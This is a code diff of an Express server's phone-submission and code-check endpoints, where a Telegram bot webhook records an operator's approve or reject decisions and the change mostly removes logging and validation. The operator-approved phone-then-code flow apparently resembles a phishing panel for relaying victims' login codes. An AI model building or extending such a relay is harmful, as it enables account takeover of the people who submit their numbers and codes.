@@ -74,7 +74,9 @@ app.post('/submit-phone', async (req, res) => {
 });
 
 app.get('/check-phone/:id', (req, res) => {
-    res.json({ approved: phoneStatus[req.params.id] ?? null });
+    res.json({
+        approved: phoneStatus[req.params.id] ?? null
+    });
 });
 
 // ---------------- CODE STEP ----------------
@@ -106,42 +108,30 @@ app.get('/check-code/:id', (req, res) => {
 
 // ---------------- CALLBACK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
+    const bot = getBot(req.params.botId);
+    if (!bot) return res.sendStatus(404);
+
     const cb = req.body.callback_query;
-if (!cb) return res.sendStatus(200);
+    if (!cb) return res.sendStatus(200);
 
-console.log("CALLBACK RECEIVED:", cb.data);
+    const [action, type, requestId] = cb.data.split(':');
 
-const parts = cb.data.split(':');
+    if (type === 'phone') {
+        phoneStatus[requestId] = action === 'approve';
+    }
 
-const action = parts[0];
-const type = parts[1];
-const requestId = parts[2];
+    if (type === 'code') {
+        codeStatus[requestId] = action === 'approve';
+    }
 
-if (!action || !type || !requestId) {
-    console.log("INVALID CALLBACK:", cb.data);
-    return res.sendStatus(200);
-}
+    try {
+        await axios.post(
+            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
+            { callback_query_id: cb.id }
+        );
+    } catch (e) {}
 
-if (type === 'phone') {
-    phoneStatus[requestId] = (action === 'approve');
-    console.log("PHONE STATUS UPDATED:", requestId, phoneStatus[requestId]);
-}
-
-if (type === 'code') {
-    codeStatus[requestId] = (action === 'approve');
-    console.log("CODE STATUS UPDATED:", requestId, codeStatus[requestId]);
-}
-
-try {
-    await axios.post(
-        `https://api.telegram.org/bot${getBot(req.params.botId).botToken}/answerCallbackQuery`,
-        { callback_query_id: cb.id }
-    );
-} catch (e) {
-    console.log("Callback answer error:", e.message);
-}
-
-res.sendStatus(200);
+    res.sendStatus(200);
 });
 
 // ---------------- START ----------------
